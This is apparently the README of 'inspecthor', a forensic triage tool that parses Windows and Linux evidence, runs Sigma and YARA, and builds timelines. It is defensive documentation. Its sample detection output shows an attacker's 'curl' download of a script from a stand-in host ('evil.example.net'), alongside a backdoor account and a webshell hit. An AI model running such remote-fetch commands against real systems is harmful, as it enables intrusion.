# inspecthor

```
██╗███╗   ██╗███████╗██████╗ ███████╗ ██████╗████████╗██╗  ██╗ ██████╗ ██████╗
██║████╗  ██║██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗
██║██╔██╗ ██║███████╗██████╔╝█████╗  ██║        ██║   ███████║██║   ██║██████╔╝
██║██║╚██╗██║╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██║██║   ██║██╔══██╗
██║██║ ╚████║███████║██║     ███████╗╚██████╗   ██║   ██║  ██║╚██████╔╝██║  ██║
╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
```

[![tests](https://github.com/Cobrastrike62/Inspecthor/actions/workflows/tests.yml/badge.svg)](https://github.com/Cobrastrike62/Inspecthor/actions/workflows/tests.yml)

Forensic triage for Windows and Linux evidence. Point it at a KAPE VHDX, a UAC
collection, a folder, or an HTB Sherlock zip; it parses everything it recognizes,
scores what looks suspicious, runs Sigma and YARA, and writes a timeline you can read.

> Work in a VM. Sherlock packages and real incident artifacts contain live malware.
> Only examine evidence you are authorized to examine.

---

## Contents

- [Install](#install) · [Get the Sigma rules](#get-the-sigma-rules) · [Quick start](#quick-start)
- [Output files](#output-files) · [Reading a row](#reading-a-row) · [Severity levels](#severity-levels)
- [Commands](#commands) · [Flags](#flags)
- [KAPE and disk images](#kape-and-disk-images) · [Supported evidence](#supported-evidence)
- [UAC / Linux triage](#uac--linux-triage-collections) · [Filesystem timelines](#filesystem-timelines)
- [Your own rules](#your-own-rules) · [Your own parser](#your-own-parser)
- [Gotchas](#gotchas) · [Performance](#performance)

---

## Install

```bash
git clone https://github.com/Cobrastrike62/Inspecthor && cd Inspecthor
./install.sh --full --link
```

| Flag | Effect |
|---|---|
| `--full` | every optional parser and detector (dissect, yara, sigma, scapy, volatility3) |
| `--windows` | dissect format libs only (evtx, registry, MFT, ESE) |
| `--detect` | YARA and Sigma only |
| `--link` | symlink `inspecthor` into `~/.local/bin` |
| `--pipx` | global command via pipx, no venv to activate |
| `--trusted-host` | required behind a TLS-intercepting corporate proxy |

Without `--full` you get a stdlib-only install. Text, syslog, JSON and SQLite
evidence still work; Windows formats don't. When it hits a file it can't read it
names the extra that unlocks it:

```
! would parse with evtx — pip install 'inspecthor[evtx]'
```

Run `inspecthor` with no arguments to list what's available in your install.

**Updating:** `git pull`. The install is editable, so new code is picked up
immediately. Re-run `./install.sh --full` when a release adds a dependency.

## Get the Sigma rules

**Do this. It is the single biggest difference in output quality.**

inspecthor bundles 6 Sigma rules. [SigmaHQ](https://github.com/SigmaHQ/sigma)
publishes about 3,300:

```bash
mkdir -p ~/sigma-rules && cd ~/sigma-rules
curl -LO https://github.com/SigmaHQ/sigma/releases/latest/download/sigma_all_rules.zip
unzip -q sigma_all_rules.zip && rm sigma_all_rules.zip
```

Then pass `--rules` on every run:

```bash
inspecthor evidence.vhdx --rules ~/sigma-rules
```

On a real 798,000-event collection that loads **2,935 applicable rules** and adds
about 5 minutes. It found domain enumeration via `nltest /dclist:`, an NTLMv1 logon,
and WebDAV over `rundll32` that the built-in scoring did not.

The rules are not vendored because they are DRL-licensed and update constantly.
Refresh them by re-running the commands above.

> Keep the rules on your Linux filesystem, not `/mnt/c`. WSL charges about 2.4 ms
> per file for metadata over 9p — roughly 8 seconds of pure `stat` on 3,300 files.

## Quick start

```bash
inspecthor sherlock.zip --rules ~/sigma-rules
```

One command. It unpacks the archive, picks a parser per file, derives the host's
timezone, hostname and year from the evidence itself, scores execution, profiles
what is rare on the host, runs Sigma and YARA, extracts indicators, and answers any
question file the package shipped with.

```
4 artifact(s) parsed, 10 events, 2 detection(s)
indicators: domain=2  ipv4=1  url=1

What the evidence says about itself
timezone  UTC                                       default (no timezone evidence found)
host      web01                                     most common host field in parsed events
year      2024                                      latest event in artifacts with absolute timestamps
activity  2024-03-01 09:10 to 2024-03-01 09:22 UTC  from artifacts with absolute timestamps

What stands out
 !!  2024-03-01 09:15:14  web01  admin     ssh_login_success  Brute-force SUCCESS: admin from 45.33.32.156 after 3 failures
 !!  2024-03-01 09:17:00  web01  backdoor  account_created    Local account created: backdoor
 !!  2024-03-01 09:20:11  web01            yara_match         YARA Inspecthor_Webshell_PHP matched shell.php
 !   2024-03-01 09:16:00  web01  admin     sudo_command       sudo: admin ran /usr/bin/curl http://evil.example.net/x.sh

Saved
  triage   pkg-triage.csv    312 rows — start here
  timeline pkg-timeline.csv  10,204 rows — everything
  report   pkg-report.md
  case     pkg.db
```

For Sherlocks, suggested answers show the event they came from. `>` means confident,
`·` means look closer. Nothing is submitted for you.

## Output files

Four files, named from the evidence path, written to the current directory:

| File | What it's for |
|---|---|
| `<case>-triage.csv` | level ≥ `med`. **Open this one.** |
| `<case>-timeline.csv` | every event, for `grep` |
| `<case>-report.md` | the writeup |
| `<case>.db` | SQLite case file, queried by `ask` / `find` / `timeline` |

Both CSVs carry the same columns: `Timestamp, Level, Title, Host, Channel, EventID,
User, Details, Type, TimestampDesc, ATTCK, Tags, Source, RecordId, ExtraFields,
ArtifactPath, Id`.

`--out DIR` writes elsewhere. `--name NAME` names the case yourself.

**Re-running is safe.** Same evidence replaces that case rather than duplicating its
events. Different evidence that produces the same name gets `evidence-2.db` and says
so. Files it doesn't recognize as its own cases are never touched.

## Reading a row

```
Timestamp            Level  Title              EventID  Details
2026-06-04 08:19:16  high   Service installed     7045   Svc: Updater Service ¦ Image: C:\…\updater.exe
                                                         --system --windows-service ¦ Type: user mode
                                                         service ¦ Start: auto start ¦ Acct: LocalSystem
```

`Details` is `Label: value` pairs separated by `¦`. Coded values keep the raw value
alongside the meaning: `Type: 10 (RemoteInteractive)`, `Status: 0xC000006A (bad
password)`.

Two label styles, and the difference is load-bearing:

| You see | Meaning |
|---|---|
| `TgtUser:`, `SrcIP:`, `Svc:` | curated label — there is a template for this event |
| `param1:`, `TargetUserName:` | raw Windows field name — no template, fields shown as-is |

Scored rows also carry a `why` explaining the level, e.g. `runs from a user-writable
path under a machine-generated name (h2cgEzNCsypd, lk9vAU)`.

Each run prints per-channel recognition. A channel at 0% has no template yet — treat
it as a coverage gap, not a quiet channel:

```
Coverage — what was recognized
  channel                                    events   titled
  Security                                  253,620    93.9%
  Microsoft-Windows-PowerShell/Operational    20,756    99.6%
  System                                      44,573    67.2%
  SentinelOne/Operational                     35,868     0.0%
```

## Severity levels

| Level | Meaning |
|---|---|
| `crit` | a service, autorun or task executing from a user-writable path |
| `high` | credible attacker activity — unusual execution paths, credential access, log clearing |
| `med` | worth a look; the default floor for `triage.csv` and `timeline` |
| `low` | recognized and routine |
| `info` | noise, or an event with no template |

`high` and `crit` come only from the curated event map and the scorers. Researched
event templates are capped at `med` — applying a large table of "high" verdicts
unreviewed produced thousands of false positives in an earlier version.

## Commands

```bash
inspecthor <evidence>                 # analyze (the word 'analyze' is optional)
inspecthor ask "when did they log in?"
inspecthor find 45.33.32.156
inspecthor timeline
```

`ask`, `find` and `timeline` use the newest `.db` in the current directory unless
you pass `--case FILE`.

```bash
inspecthor find 'evil\.(com|net)' --regex --limit 50
inspecthor timeline --min-level high
inspecthor timeline --all --limit 5000
```

## Flags

**`analyze`**

| Flag | Effect |
|---|---|
| `--rules DIR` | your YARA `.yar` and Sigma `.yml` rules, used in addition to the built-ins |
| `--out DIR` | where to write outputs (default: here) |
| `--name NAME` | name the case and its files |
| `--no-detect` | skip the YARA and Sigma pass |
| `--tz ZONE` | override the derived timezone, e.g. `America/Chicago` |
| `--year YYYY` | override the derived year |
| `--host NAME` | override the derived hostname |

The three overrides exist because syslog records neither a year nor a UTC offset:

```
Mar  1 09:15:01 web01 sshd[1010]: Failed password for admin from 45.33.32.156
```

inspecthor parses self-dating evidence first, derives the year from absolute event
timestamps and the timezone and hostname from the registry, then reads the ambiguous
files with that context. It prints every derived value and where it came from. Use
the overrides when it's wrong.

**`ask`** — `--case FILE`

**`find`** — `--regex`, `--limit N` (default 200), `--case FILE`

**`timeline`** — `--all`, `--min-level {info,low,med,high,crit}` (default `med`),
`--limit N` (default 500), `--case FILE`

## KAPE and disk images

Point it at the VHDX. No mounting, no extracting first:

```bash
inspecthor 2026-07-27T191212_HOSTNAME.vhdx --rules ~/sigma-rules
```

It opens the container, finds the NTFS volume, and extracts **only files a parser
claims** — a collection is mostly formats with no parser yet, and copying it all out
wastes gigabytes. It reports what it skipped:

```
vhdx image: pulled 225 parseable file(s) (839 MB); left behind 516 .pf, 477 .lnk,
43 .automaticdestinations-ms — no parser for those yet
```

A KAPE collection includes the registry, so the timezone and computer name are read
rather than guessed.

Also handles VHD, E01, VMDK and QCOW2.

## Supported evidence

| Evidence | Needs |
|---|---|
| Linux `auth.log`, `secure`, `syslog` — rotated and gzipped included | nothing |
| Timestamped app logs, Apache/nginx access logs, plain text | nothing |
| **MongoDB** server logs (`mongod.log`, 4.4+ JSON format) | nothing |
| **Linux config and accounts** — `mongod.conf`, `sshd_config`, `passwd`, `shadow`, `sudoers`, `authorized_keys`, `cron` | nothing |
| **Filesystem timelines** — Sleuth Kit / mactime `bodyfile` | nothing |
| **UAC collections** (Unix-like Artifacts Collector) | nothing |
| Windows Event Logs — Security, System, PowerShell, Sysmon, Task, RDP, Defender | `--full` |
| Registry hives — Run keys, services, timezone, USB, UserAssist, amcache | `--full` |
| KAPE collections and disk images — VHDX, VHD, E01, VMDK, QCOW2 | `--full` |

**Not yet:** `$MFT`/`$J`, prefetch, LNK, SRUM, browser history, PCAP, memory, cloud
logs, `wtmp`/`btmp`/`lastlog`, systemd journals. Registry transaction logs
(`.LOG1`/`.LOG2`) are skipped rather than replayed, so unflushed hive changes are
invisible.

### UAC / Linux triage collections

Point it at the collection directory or its zip:

```bash
inspecthor uac-hostname-linux-triage.zip --rules ~/sigma-rules
```

Three things happen that are worth knowing about.

**Logs are named, not lumped.** Every text log used to arrive as `generic_text`, which
made `mongod.log` indistinguishable from `apt/history.log` in the timeline. Now
`source_artifact` identifies it — `text/mongodb`, `text/apt`, `text/cloud-init`,
`text/uac-live-response/process`.

**Configuration is read as evidence.** `mongod.conf`, `sshd_config`, `passwd`, `shadow`,
`sudoers`, `authorized_keys` and `cron` entries produce findings:

```
[crit] Service listens on every interface with NO authentication
       bindIp: 0.0.0.0 ¦ port: 27017 ¦ authorization: not set ¦ security block: commented out
[crit] sshd: root login permitted WITH password authentication
[high] Passwordless sudo rule
```

Comments are parsed, not skipped — a commented-out `#security:` block *is* the finding,
and it looks identical to a missing one unless you read the comments.

**Collector sweepings are declined.** A UAC run collects the whole of `/etc`, and about
3,000 of those files are AppArmor abstractions, certificate hash links and gzipped man
pages. Those are registered and counted but not turned into timeline events. Security-
relevant config is exempt from that: `/etc/sudoers.d/`, `/etc/cron.d/`,
`/etc/systemd/system/` and `.ssh/authorized_keys` are always parsed.

### Filesystem timelines

A `bodyfile` is one event per **distinct timestamp**, using mactime's MACB notation:

```
Timestamp            MACB   Title                     Details
2025-12-29 05:26:41  m.c.   File modified             MACB: m.c. ¦ Path: /var/lib/mongodb/… ¦ Mode: -rw-------
2020-09-13 12:26:40  ...b   File created              MACB: ...b ¦ Path: /usr/bin/legit ¦ Mode: -rwxr-xr-x
```

Most entries sit at `info` — a bodyfile is mostly the operating system. Promoted are
executables in world-writable directories, SUID binaries outside `/usr/bin`-style paths,
changes to `/etc/shadow`, `sudoers`, `cron` and `authorized_keys`, and shell-history or
credential files.

This is where "what did they touch" lives when the application log cannot say. MongoDB,
for instance, logs no queries by default: its log can prove 37,630 connections happened
and never what was read.

## Your own rules

Drop `.yar` or Sigma `.yml` files into a directory and pass `--rules DIR`. No code.

Sigma support is a documented subset: field/value maps, lists of maps, the modifiers
`contains` `startswith` `endswith` `re` `all` `base64` `base64offset` `cased`
`windash`, and `and` / `or` / `not` / `1 of x` / `all of x` conditions. Aggregations
(`| count() >`) are not supported; those rules are skipped with a hint rather than
mis-evaluated.

## Your own parser

One file in `inspecthor/parsers/plugins/`. The registry finds it — nothing else to
touch:

```python
@register
class PrefetchParser(Parser):
    name, display, category = "prefetch", "Windows Prefetch", "windows"
    magic = (b"MAM\x04",)
    path_globs = ("*.pf",)

    def parse(self, path, ctx):
        for name, run_time, count in _read(path):
            yield ctx.event(timestamp=run_time, timestamp_desc="Last Run",
                            event_type="process_exec", attck=["T1204"],
                            message=f"{name} executed (run #{count})")
```

Import anything optional *inside* `parse()`, or discovery breaks on a stdlib-only
install. [DESIGN.md](DESIGN.md) has the parser contract, the event schema, and the
reasoning behind the architecture.

## Gotchas

**Timestamps are UTC.** Even when inspecthor correctly derives that the host was
`UTC−05:00`, output is UTC. An incident you remember at 11:50 local appears at
16:55. Converting output to host-local time is a known gap.

**YARA has no non-capturing groups.** Write `(a|b)`, never `(?:a|b)` — one bad rule
fails the whole ruleset.

**Keep Sigma rules off `/mnt/c`** under WSL. See
[Get the Sigma rules](#get-the-sigma-rules).

**Sherlock answers are candidates.** Verify before submitting.

## Performance

Measured on a 2.1 GB KAPE VHDX — 797,972 events, 225 extracted files:

| Stage | Cost |
|---|---|
| Parse + score + rarity profile | a few minutes |
| Sigma, 2,935 applicable rules | 313 s |
| Case file | 1.9 GB |
| `triage.csv` / `timeline.csv` | 26 MB / 571 MB |

A Sherlock package is thousands of events, not hundreds of thousands — seconds, not
minutes.

## Tests

```bash
pytest -q
```

Fully offline; every fixture is generated. Passes on a stdlib-only install, with
format-specific tests skipping themselves.

## License and attribution

MIT — see [LICENSE](LICENSE).

Bundles a slimmed copy of the **MITRE ATT&CK®** Enterprise matrix (v19.1) so
technique names resolve offline, derived from
[mitre-attack/attack-stix-data](https://github.com/mitre-attack/attack-stix-data).

> ATT&CK® is a registered trademark of The MITRE Corporation.
> © 2026 The MITRE Corporation. This work is reproduced and distributed with the
> permission of The MITRE Corporation. MITRE does not endorse or sponsor this
> project.

Optional extras install third-party packages under their own licenses, several
copyleft — see [NOTICE](NOTICE) before redistributing a bundle that includes them.

Sigma rules fetched from SigmaHQ are licensed under the
[Detection Rule License](https://github.com/SigmaHQ/sigma/blob/master/LICENSE.Detection.Rules.md)
and are not distributed with inspecthor.
